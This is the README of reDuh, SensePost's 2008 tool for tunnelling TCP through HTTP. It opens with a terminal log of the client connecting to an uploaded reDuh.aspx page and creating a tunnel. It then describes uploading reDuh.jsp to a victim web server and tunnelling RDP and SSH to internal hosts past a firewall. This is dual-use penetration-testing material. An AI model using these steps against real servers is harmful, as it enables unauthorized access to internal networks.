
```
java ‐jar reDuhClient.jar http://192.168.1.119/reDuh.aspx

[Info]Querying remote web page for usable remote service port
[Info]Remote RPC port chosen as 42000
[Info]Attempting to start reDuh from 192.168.1.119:80/reDuh.aspx. Using service port 42000. Please wait...
[Info]reDuhClient service listener started on local port 1010

root@John:~# telnet 127.0.0.1 1010
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.
Welcome to the reDuh command line
>>[createTunnel]30080:127.0.0.1:80
Successfully bound locally to port 30080. Awaiting connections.

tcp6 0 0 :::1010 :::* LISTEN 6102/java
tcp6 0 0 :::30080 :::\* LISTEN 6102/java



```

# 1. Name
ReDuh
# 2. Authors
Glenn  
Ian de Villiers < ian(at)sensepost(dot)com >  
Gert Burger < gert(at)sensepost(dot)com >  
# 3. License, version & release date
License : GPL  
Version : v.0.3  
Release Date : 2008/07/29
# 4. Description
ReDuh was released as part of SensePost's BlackHat USA 2008 talk on tunnelling data in and out of networks.
ReDuh is a tool that can be used to create a TCP circuit through validly formed HTTP requests.
Essentially this means that if we can upload a JSP/PHP/ASP page on a server, we can connect to hosts behind that server trivially.
# 5. Usage
## 5.1 Basic Overview
1. Glenn has the ability to upload / create a JSP page on the remote server
2. Glenn wishes to make an RDP connection to the server term-serv.victim.com (visible to the web-server behind the firewall)
3. The firewall permits HTTP traffic to the webserver but denies everything else 
4. Glenn uploads reDuh.jsp to http://ubuntoo.victim.com/uploads/reDuh.jsp
5. Glenn runs reDuhClient on his machine and points it to the page: $ `java -jar reDuhClient.jar http://ubuntoo.victim.com/uploads/reDuh.jsp` (http or https)
6. Glenn administers reDuhClient by connecting to its management port (1010 by default)
7. Once connected, Glenn types: `[createTunnel]1234:term-serv.victim.com:3389`
8. Now Glenn launches his RDP client and aims it at localhost:1234

The system can handle multiple connections, so while RDP is running, we can use the management connection `(on port 1010) ` again, and request `[createTunnel]5555:sshd.victim.com:22`
Glenn can now ssh to localhost on port 5555 to access the sshd on sshd.victim.com (while still running his RDP session)  
## 5.2 Un-needed technical details
1. Behind the scenes, reDuhClient starts listening on 1234 and sends an HTTP message to /uploads/reDuh.jsp which opens a socket to term-serv.victim.com:3389
2. Any traffic sent to the local socket on 1234 is encoded, and wrapped in HTTP requests and is sent to the /uploads/reDuh.jsp
3. Any traffic from term-serv.victim.com:3389 to the jsp is placed in a queue and sent back to reDuhClient when it requests it

# 6. Requirements
ability to upload / create a JSP page on the remote server
## 6.1 Disclaimer
The JSP version of reDuh is the most deployed/used/tested version. ASPX & PHP ports were done for completeness (but not extensively tested). Please let us know if you have any bug reports on any of these tools
# 7. Additional Resources 
Blackhat USA 2008 slides: http://www.sensepost.com/cms/resources/labs/conferences/eye_of_the_needle/SensePost_Eye_of_a_Needle.pdf
